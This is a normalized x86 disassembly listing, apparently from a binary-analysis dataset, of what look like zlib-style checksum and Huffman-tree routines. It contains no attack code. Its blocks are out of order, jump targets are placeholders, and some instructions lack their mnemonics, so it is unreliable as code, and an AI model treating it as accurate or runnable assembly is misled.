mov [ esi + 0x8 ] edx
mov edx [ esp + 0x48 ]
push esi
push ebx
mov [ ebx + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ ebx + 0xc ]
mov edx [ esi + 0x28 ]
push ecx
push edx
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x9
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
push 0xfffffffc
push esi
mov [ esi + 0x8 ] ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov [ ebx + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x6
jmp r-xdata
cmp eax 0x12
mov ecx 0x7
je r-xdata
mov ecx edx
sub ebp edx
mov edx [ ebx + 0xc ]
shr edi cl
mov ecx [ ebx + 0x8 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebx + 0x8 ]
inc eax
jmp r-xdata
mov edx ecx
xor ecx ecx
dec edx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov edx ecx
mov ecx ebp
shl edx cl
mov ecx [ esp + 0x10 ]
add ebp 0x8
or edi edx
inc ecx
cmp ebp eax
mov [ esp + 0x10 ] ecx
jb r-xdata
mov [ ebx ] 0x7
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ eax ]
mov ecx edi
sub ecx edx
mov edx [ esp + 0x44 ]
add ebp ecx
push 0xfffffffc
push eax
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
shr esi 0x3
mov [ esp + 0x18 ] esi
sub ebp 0x3
mov [ ebx ] 0x6
jmp r-xdata
mov eax esi
and eax 0x7
mov ecx eax
shr eax 0x1
and ecx 0x1
cmp eax 0x3
mov [ ebx + 0x18 ] ecx
ja r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x44 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x1c ]
and ecx 0x3
sub edx eax
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
mov esi [ esp + 0x44 ]
add ecx eax
mov [ esp + 0x10 ] ecx
mov ecx [ ebx + 0x4 ]
sub edi eax
add esi eax
sub ecx eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x1c ] edx
mov [ ebx + 0x4 ] ecx
jne r-xdata
mov eax ecx
mov ecx [ ebx + 0x2c ]
sub ecx edx
mov ecx esi
sub ecx edx
dec ecx
jmp r-xdata
mov edx esi
cmp edx eax
mov [ esp + 0x44 ] edx
jae r-xdata
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x10 ]
push 0xfffffffc
mov ecx eax
push esi
sub ecx edi
mov [ esi ] eax
add edx ecx
push ebx
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x50 ]
mov [ ebx + 0x34 ] edx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
shr edi 0xe
sub ebp 0xe
mov [ ebx + 0x8 ] 0x0
mov [ ebx ] 0x4
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
push ecx
push esi
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x9
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov edx eax
and eax 0x1f
shr edx 0x5
and edx 0x1f
lea eax [ edx + eax + 0x102 ]
cmp ecx eax
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov ecx eax
mov [ esi + 0x4 ] edx
mov edx [ esi + 0x8 ]
sub ecx edi
mov [ esi ] eax
mov eax [ esp + 0x4c ]
add edx ecx
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x44 ]
push eax
push esi
push ebx
mov [ ebx + 0x34 ] edx
call sub_409760
add esp 0xc
cmp eax 0x1
jne r-xdata
sub eax 0x12
mov [ esp + 0x1c ] ecx
neg eax
sbb eax eax
add ecx edx
and al 0xf8
mov [ esp + 0x20 ] ecx
add eax 0xb
cmp ebp ecx
jae r-xdata
lea ecx [ eax - 0xe ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov edx eax
shr edx 0x5
and edx 0x1f
and eax 0x1f
lea eax [ edx + eax + 0x102 ]
cmp ecx eax
jb r-xdata
mov [ ebx + 0x34 ] ecx
mov ecx [ esp + 0x4c ]
push ecx
push esi
push ebx
call sub_40a660
mov ecx [ ebx + 0x34 ]
mov edx [ ebx + 0x30 ]
add esp 0xc
cmp edx ecx
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov eax [ ebx + 0x2c ]
mov [ esp + 0x1c ] ecx
cmp edx eax
mov [ esp + 0x20 ] eax
jne r-xdata
sub ecx edx
sub eax edx
dec eax
mov ecx eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
shr edx 0xa
add edx 0x4
cmp eax edx
jae r-xdata
mov ecx edx
shr edi cl
mov ecx [ esp + 0x1c ]
mov ecx [ ecx * 4 + rw-data ]
and ecx edi
add eax ecx
mov ecx [ esp + 0x1c ]
shr edi cl
add ecx edx
mov [ esp + 0x18 ] eax
sub ebp ecx
mov ecx [ ebx + 0x8 ]
mov [ esp + 0x1c ] ecx
mov ecx [ ebx + 0x4 ]
mov edx ecx
and ecx 0x1f
shr edx 0x5
and edx 0x1f
lea ecx [ edx + ecx + 0x102 ]
mov edx [ esp + 0x1c ]
add eax edx
cmp eax ecx
ja r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov eax [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov ebp [ edi ]
mov esi [ edi + 0x8 ]
mov [ edi + 0x4 ] ecx
mov ecx eax
mov [ edi ] eax
sub ecx ebp
add esi ecx
mov [ edi + 0x8 ] esi
mov [ ebx + 0x34 ] edx
mov edx [ esp + 0x4c ]
push edx
push edi
push ebx
call sub_40a660
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edi [ esp + 0x14 ]
mov edx eax
cmp edx esi
mov [ esp + 0x44 ] edx
jae r-xdata
test ecx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov [ ebx ] 0x9
mov [ esi + 0x18 ] rw-data
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x4c ]
add ecx edx
push 0xfffffffd
push esi
mov [ esi + 0x8 ] ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_40a660
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
cmp [ esp + 0x34 ] 0x10
jne r-xdata
mov edx ecx
xor ecx ecx
dec edx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov edx ecx
mov ecx ebp
shl edx cl
mov ecx [ esp + 0x10 ]
add ebp 0x8
or edi edx
inc ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x20 ]
cmp ebp ecx
jb r-xdata
mov ecx [ esp + 0x20 ]
sub ecx edx
sub esi edx
dec esi
mov ecx esi
jmp r-xdata
mov eax [ esp + 0x1c ]
xor ecx ecx
mov eax edx
cmp eax 0x1
jb r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x1c ] ecx
mov edx [ ebx + 0xc ]
inc eax
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx [ esp + 0x18 ]
dec edx
mov [ esp + 0x18 ] edx
jne r-xdata
mov ecx [ ebx + 0xc ]
mov ecx [ ecx + eax * 4 - 0x4 ]
jmp r-xdata
sub_407d60
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push 0x0
push esi
push edi
call sub_406f30
mov eax [ edi + 0x28 ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
mov edx [ edi + 0x24 ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
mov ecx [ esi + 0x28 ]
push edi
push ecx
call [ esi + 0x24 ]
add esp 0x24
xor eax eax
pop edi
pop esi
retn
sub_407da0
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov ecx edi
and ecx 0xffff
shr edi 0x10
test esi esi
jne r-xdata
push ebx
mov ebx [ esp + 0x18 ]
test ebx ebx
jbe r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov eax edi
pop ebx
shl eax 0x10
pop edi
or eax ecx
pop esi
retn
push ebp
sub ebx eax
cmp eax 0x10
jl r-xdata
mov eax 0x15b0
test eax eax
je r-xdata
mov ebp eax
shr ebp 0x4
mov edx ebp
neg edx
shl edx 0x4
add eax edx
mov eax ecx
xor edx edx
mov ecx 0xfff1
div ecx
mov eax edi
mov edi 0xfff1
mov ecx edx
xor edx edx
div edi
test ebx ebx
mov edi edx
ja r-xdata
xor edx edx
mov dl [ esi ]
add ecx edx
inc esi
add edi ecx
dec eax
jne r-xdata
xor edx edx
mov dl [ esi ]
add esi 0x10
add ecx edx
xor edx edx
mov dl [ esi - 0xf ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xe ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xd ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xc ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xb ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0xa ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x9 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x8 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x7 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x6 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x5 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x4 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x3 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x2 ]
add edi ecx
add ecx edx
xor edx edx
mov dl [ esi - 0x1 ]
add edi ecx
add ecx edx
add edi ecx
dec ebp
jne r-xdata
cmp ebx 0x15b0
mov eax ebx
jb r-xdata
pop ebp
sub_407f00
mov edx [ esp + 0x4 ]
push esi
mov ecx 0x11e
xor esi esi
lea eax [ edx + 0x8c ]
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
lea eax [ edx + 0x980 ]
mov ecx 0x1e
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
lea eax [ edx + 0xa74 ]
mov ecx 0x13
mov [ eax ] si
add eax 0x4
dec ecx
jne r-xdata
mov [ edx + 0x16a4 ] esi
mov [ edx + 0x16a0 ] esi
mov [ edx + 0x16a8 ] esi
mov [ edx + 0x1698 ] esi
mov [ edx + 0x48c ] 0x1
pop esi
retn
sub_407f70
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
mov edx [ esp + 0x10 ]
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x3
mov [ eax + 0x16b4 ] ecx
mov edx [ esp + 0x10 ]
push ebx
push esi
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
push edi
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ edi + esi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
pop edi
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16b4 ] esi
pop esi
pop ebx
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push 0x1
push ecx
push edx
push eax
call sub_409680
add esp 0x10
retn
sub_408010
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x10 ]
xor eax eax
push edi
mov ecx [ esi + 0x7c ]
test ecx ecx
jle r-xdata
lea ecx [ ebp + 0x5 ]
cmp [ esi + 0x1c ] 0x2
jne r-xdata
cmp ecx edx
mov ecx [ esi + 0x16b4 ]
jne r-xdata
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
lea eax [ esi + 0xb10 ]
push eax
push esi
call sub_408200
lea ecx [ esi + 0xb1c ]
push ecx
push esi
call sub_408200
push esi
call sub_4087d0
mov edx [ esi + 0x16a0 ]
mov ecx [ esi + 0x16a4 ]
add edx 0xa
add ecx 0xa
shr edx 0x3
shr ecx 0x3
add esp 0x14
cmp ecx edx
ja r-xdata
push esi
call sub_409560
add esp 0x4
mov edi [ esp + 0x20 ]
cmp ecx 0xd
lea edx [ edi + 0x4 ]
jle r-xdata
mov edi [ esp + 0x20 ]
cmp ecx 0xd
lea eax [ edi + 0x2 ]
jle r-xdata
mov edi [ esp + 0x20 ]
push edi
push ebp
push ebx
push esi
call sub_407f70
add esp 0x10
jmp r-xdata
lea edi [ ebp + 0x4 ]
cmp edi edx
ja r-xdata
jmp r-xdata
shl edx cl
or [ esi + 0x16b0 ] dx
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov ebx edx
mov ebp [ esi + 0x8 ]
shl ebx cl
or [ esi + 0x16b0 ] bx
mov ebx [ esi + 0x14 ]
mov cl [ esi + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ esi + 0x14 ]
mov ebp [ esi + 0x8 ]
inc ebx
mov [ esi + 0x14 ] ebx
mov ecx ebx
xor ebx ebx
mov bl [ esi + 0x16b1 ]
mov [ ecx + ebp ] bl
mov ecx [ esi + 0x14 ]
mov ebx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr dx cl
add ebx 0xfffffff3
mov [ esi + 0x16b4 ] ebx
mov [ esi + 0x16b0 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov edx eax
shl edx cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x14 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ebx + ecx ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
push esi
call sub_407f00
add esp 0x4
test edi edi
je r-xdata
mov edx ecx
pop edi
pop esi
pop ebp
pop ebx
retn
push esi
call sub_409600
add esp 0x4
mov ecx [ esi + 0xb14 ]
inc eax
push eax
mov eax [ esi + 0xb20 ]
inc eax
inc ecx
push eax
push ecx
push esi
call sub_408930
lea edx [ esi + 0x980 ]
lea eax [ esi + 0x8c ]
push edx
push eax
push esi
call sub_409120
add esp 0x1c
push r--data
push r--data
push esi
call sub_409120
add esp 0xc
jmp r-xdata
sub_408200
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ eax ]
mov eax [ eax + 0x8 ]
or ebp 0xffffffff
mov ebx [ eax ]
mov ecx [ eax + 0xc ]
xor eax eax
mov [ esp + 0x14 ] ecx
cmp ecx eax
mov [ esp + 0x10 ] ebp
mov [ esi + 0x1448 ] eax
mov [ esi + 0x144c ] 0x23d
jle r-xdata
mov ecx [ esi + 0x1448 ]
cmp ecx 0x2
jge r-xdata
mov edx edi
mov edx [ esp + 0x20 ]
mov [ edx + 0x4 ] ebp
mov eax [ esi + 0x1448 ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
cmp ebx 0x1
jl r-xdata
cmp ebp 0x2
jge r-xdata
mov [ edx + 0x2 ] 0x0
mov ecx [ esi + 0x1448 ]
mov [ esp + 0x10 ] eax
inc ecx
mov ebp eax
mov [ esi + 0x1448 ] ecx
mov [ esi + ecx * 4 + 0xb54 ] eax
mov [ eax + esi + 0x1450 ] 0x0
jmp r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
lea eax [ edi + eax * 4 ]
mov [ esp + 0x1c ] eax
push ebx
push edi
push esi
call sub_408440
add esp 0xc
dec ebx
cmp ebx 0x1
jge r-xdata
xor eax eax
inc ebp
mov eax ebp
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
and ecx 0xff
mov eax ecx
and eax 0xff
jmp r-xdata
mov ecx [ esi + 0x1448 ]
cmp ecx 0x2
jl r-xdata
xor ecx ecx
mov cx [ ebx + eax * 4 + 0x2 ]
mov eax [ esi + 0x16a4 ]
sub eax ecx
mov [ esi + 0x16a4 ] eax
inc ecx
mov [ esi + 0x1448 ] ecx
mov [ esi + ecx * 4 + 0xb54 ] eax
mov [ edi + eax * 4 ] 0x1
mov [ esi + eax + 0x1450 ] 0x0
mov edx [ esi + 0x16a0 ]
dec edx
test ebx ebx
mov [ esi + 0x16a0 ] edx
je r-xdata
mov eax [ esi + 0x1448 ]
mov ebx [ esi + 0xb58 ]
push 0x1
push edi
mov ecx [ esi + eax * 4 + 0xb54 ]
dec eax
push esi
mov [ esi + 0xb58 ] ecx
mov [ esi + 0x1448 ] eax
call sub_408440
mov edx [ esi + 0x144c ]
mov ebp [ esi + 0xb58 ]
add esp 0xc
dec edx
mov eax edx
mov [ esi + 0x144c ] edx
mov [ esi + eax * 4 + 0xb54 ] ebx
mov ecx [ esi + 0x144c ]
dec ecx
mov eax ecx
mov [ esi + 0x144c ] ecx
mov [ esi + eax * 4 + 0xb54 ] ebp
mov dx [ edi + ebp * 4 ]
add dx [ edi + ebx * 4 ]
mov eax [ esp + 0x1c ]
mov [ eax ] dx
mov al [ esi + ebx + 0x1450 ]
mov cl [ esi + ebp + 0x1450 ]
cmp al cl
jb r-xdata
mov edx [ esi + 0x144c ]
mov ecx [ esi + 0xb58 ]
dec edx
mov [ esi + 0x144c ] edx
mov eax edx
mov edx [ esp + 0x20 ]
push edx
push esi
mov [ esi + eax * 4 + 0xb54 ] ecx
call sub_408520
mov eax [ esp + 0x18 ]
add esi 0xb34
push esi
push eax
push edi
call sub_408750
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
inc al
push 0x1
push edi
mov [ esi + ecx + 0x1450 ] al
mov eax [ esp + 0x24 ]
mov [ edi + ebp * 4 + 0x2 ] cx
mov [ edi + ebx * 4 + 0x2 ] cx
mov [ esi + 0xb58 ] ecx
inc ecx
add eax 0x4
push esi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x28 ] eax
call sub_408440
mov eax [ esi + 0x1448 ]
add esp 0xc
cmp eax 0x2
jge r-xdata
mov [ esp + 0x10 ] ebp
sub_408440
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
mov edx [ eax + 0x1448 ]
push edi
mov ebp [ eax + esi * 4 + 0xb54 ]
lea ecx [ esi + esi ]
cmp ecx edx
mov [ esp + 0x14 ] ebp
jg r-xdata
mov [ eax + esi * 4 + 0xb54 ] ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi [ esp + 0x18 ]
mov esi [ eax + ecx * 4 + 0xb54 ]
mov dx [ edi + ebp * 4 ]
mov bx [ edi + esi * 4 ]
cmp dx bx
jb r-xdata
mov esi [ eax + ecx * 4 + 0xb58 ]
mov ebp [ eax + ecx * 4 + 0xb54 ]
mov dx [ edi + esi * 4 ]
mov bx [ edi + ebp * 4 ]
cmp dx bx
jb r-xdata
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + ecx * 4 + 0xb54 ] ebp
pop ebp
pop ebx
retn
jne r-xdata
inc ecx
jne r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x1c ] ecx
shl ecx 0x1
mov [ eax + edx * 4 + 0xb54 ] esi
mov edx [ eax + 0x1448 ]
cmp ecx edx
jle r-xdata
mov dl [ eax + ebp + 0x1450 ]
mov bl [ esi + eax + 0x1450 ]
cmp dl bl
jbe r-xdata
mov ebp [ esp + 0x14 ]
mov dl [ esi + eax + 0x1450 ]
mov bl [ eax + ebp + 0x1450 ]
cmp dl bl
ja r-xdata
jge r-xdata
mov edx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + edx * 4 + 0xb54 ] ebp
pop ebp
pop ebx
retn
sub_408520
sub esp 0x1c
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov ebx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ esp + 0x18 ] ecx
push edi
xor esi esi
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov ebp [ eax + 0x10 ]
mov [ esp + 0x14 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x30 ]
mov ecx 0x8
xor eax eax
lea edi [ edx + 0xb34 ]
mov [ esp + 0x10 ] esi
[ edi ]
mov eax [ edx + 0x144c ]
mov [ esp + 0x28 ] ebp
mov ecx [ edx + eax * 4 + 0xb54 ]
mov [ ebx + ecx * 4 + 0x2 ] si
mov esi [ edx + 0x144c ]
inc esi
cmp esi 0x23d
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
lea eax [ edx + esi * 4 + 0xb54 ]
mov [ esp + 0x30 ] eax
mov eax 0x23d
sub eax esi
add esi eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x34 ] esi
mov edi [ esp + 0x1c ]
mov [ ebx + ecx * 4 + 0x2 ] ax
cmp ecx edi
jg r-xdata
mov edi [ esp + 0x10 ]
mov eax ebp
inc edi
mov [ esp + 0x10 ] edi
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x18 ]
add ecx 0x4
dec eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x18 ] eax
jne r-xdata
mov esi [ esp + 0x20 ]
inc [ edx + eax * 2 + 0xb34 ]
xor edi edi
cmp ecx esi
jl r-xdata
mov ecx [ esp + 0x30 ]
xor eax eax
xor edi edi
mov ecx [ ecx ]
mov ax [ ebx + ecx * 4 + 0x2 ]
mov di [ ebx + eax * 4 + 0x2 ]
mov eax edi
inc eax
cmp eax ebp
jle r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov si [ ebx + ecx * 4 ]
add eax edi
and esi 0xffff
imul eax esi
add [ edx + 0x16a0 ] eax
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edi ecx
sub edi esi
mov esi [ esp + 0x24 ]
mov edi [ esi + edi * 4 ]
lea eax [ ebp - 0x1 ]
cmp [ edx + eax * 2 + 0xb34 ] 0x0
lea ecx [ edx + eax * 2 + 0xb34 ]
jne r-xdata
mov esi [ esp + 0x34 ]
mov ebp [ esp + 0x14 ]
xor eax eax
mov ax [ ebp + ecx * 4 + 0x2 ]
mov ecx [ edx + 0x16a4 ]
add eax edi
mov ebp [ esp + 0x28 ]
imul eax esi
add ecx eax
mov [ edx + 0x16a4 ] ecx
dec [ edx + eax * 2 + 0xb34 ]
add [ edx + eax * 2 + 0xb36 ] 0x2
dec [ edx + ebp * 2 + 0xb34 ]
sub edi 0x2
test edi edi
jg r-xdata
sub ecx 0x2
dec eax
cmp [ ecx ] 0x0
je r-xdata
test ebp ebp
mov edi ebp
je r-xdata
lea ebp [ edx + ebp * 2 + 0xb34 ]
mov [ esp + 0x18 ] ebp
mov ebp [ esp + 0x18 ]
dec edi
sub ebp 0x2
test edi edi
mov [ esp + 0x18 ] ebp
jne r-xdata
lea ebp [ edx + esi * 4 + 0xb54 ]
xor eax eax
mov ax [ ebp ]
test eax eax
mov [ esp + 0x30 ] eax
je r-xdata
test eax eax
jne r-xdata
lea esi [ ebx + ecx * 4 + 0x2 ]
xor eax eax
mov ax [ esi ]
cmp eax edi
je r-xdata
mov esi [ esp + 0x34 ]
mov ecx [ ebp - 0x4 ]
dec esi
sub ebp 0x4
mov [ esp + 0x34 ] esi
mov esi [ esp + 0x1c ]
cmp ecx esi
mov [ esp + 0x28 ] ebp
jg r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
dec eax
mov [ esp + 0x30 ] eax
mov ebp edi
sub ebp eax
xor eax eax
mov ax [ ebx + ecx * 4 ]
imul ebp eax
mov eax [ edx + 0x16a0 ]
add eax ebp
mov ebp [ esp + 0x28 ]
mov [ edx + 0x16a0 ] eax
mov [ esi ] di
sub_408750
mov edx [ esp + 0xc ]
sub esp 0x20
xor eax eax
lea ecx [ esp + 0x2 ]
push esi
lea esi [ esp + 0x6 ]
sub edx esi
push edi
mov esi 0xf
mov di [ edx + ecx ]
add ecx 0x2
add di ax
shl edi 0x1
mov eax edi
dec esi
mov [ ecx - 0x2 ] ax
jne r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jl r-xdata
pop edi
pop esi
add esp 0x20
retn
mov esi [ esp + 0x2c ]
lea edi [ eax + 0x1 ]
add esi 0x4
dec edi
jne r-xdata
mov dx [ esp + ecx * 2 + 0x8 ]
push ecx
mov eax edx
and eax 0xffff
inc edx
push eax
mov [ esp + ecx * 2 + 0x10 ] dx
call sub_4095e0
add esp 0x8
mov [ esi ] ax
xor ecx ecx
mov cx [ esi + 0x2 ]
test ecx ecx
je r-xdata
sub_4087d0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xb14 ]
lea ecx [ esi + 0x8c ]
push eax
push ecx
push esi
call sub_408840
mov edx [ esi + 0xb20 ]
lea eax [ esi + 0x980 ]
push edx
push eax
push esi
call sub_408840
lea ecx [ esi + 0xb28 ]
push ecx
push esi
call sub_408200
add esp 0x20
mov eax 0x12
mov edx [ esi + 0x16a0 ]
lea ecx [ eax + eax * 2 + 0x11 ]
add edx ecx
mov [ esi + 0x16a0 ] edx
pop esi
retn
dec eax
cmp eax 0x3
jge r-xdata
xor edx edx
mov dl [ eax + r--data ]
cmp [ esi + edx * 4 + 0xa76 ] 0x0
jne r-xdata
sub_408840
push ecx
mov eax [ esp + 0xc ]
push ebx
xor ecx ecx
push esi
mov cx [ eax + 0x2 ]
push edi
xor edi edi
mov [ esp + 0xc ] 0xffffffff
test ecx ecx
mov edx 0x7
mov esi 0x4
jne r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
mov [ eax + ebx * 4 + 0x6 ] 0xffff
jl r-xdata
mov edx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
pop ecx
retn
inc ebx
push ebp
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
lea ebp [ eax + 0x6 ]
cmp edi esi
jge r-xdata
cmp eax ecx
je r-xdata
